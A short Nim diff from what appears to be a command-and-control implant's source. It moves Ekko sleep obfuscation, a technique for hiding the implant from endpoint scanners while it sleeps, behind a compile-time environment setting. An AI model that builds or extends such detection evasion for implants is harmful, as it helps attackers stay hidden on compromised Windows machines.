@@ -60,7 +60,10 @@ when defined(windows):
 
 # Conditional imports for Windows-only features
 when defined(windows):
-  import utils/ekko
+  # Only import ekko if sleep obfuscation is enabled at compile time
+  const sleepObfuscation {.used.} = static: getEnv("SLEEP_OBFUSCATION", "none")
+  when sleepObfuscation == "ekko":
+    import utils/ekko
 
 type
   BackgroundTaskType = enum
@@ -1253,13 +1256,16 @@ proc sleep*(agent: Agent) =
   
   # Use Ekko sleep obfuscation if enabled (only for sleeps >= 3 seconds)
   when defined(windows):
-    if agent.config.sleepObfuscation == "ekko" and sleepTime >= 3:
-      if agent.config.debug:
-        echo "[DEBUG] Using Ekko sleep obfuscation"
-      ekkoObf(sleepTime * 1000)
+    when sleepObfuscation == "ekko":
+      if sleepTime >= 3:
+        if agent.config.debug:
+          echo "[DEBUG] Using Ekko sleep obfuscation"
+        ekkoObf(sleepTime * 1000)
+      else:
+        if agent.config.debug:
+          echo "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
+        os.sleep(sleepTime * 1000)
     else:
-      if agent.config.debug and agent.config.sleepObfuscation == "ekko" and sleepTime < 3:
-        echo "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
       os.sleep(sleepTime * 1000)
   else:
     os.sleep(sleepTime * 1000)
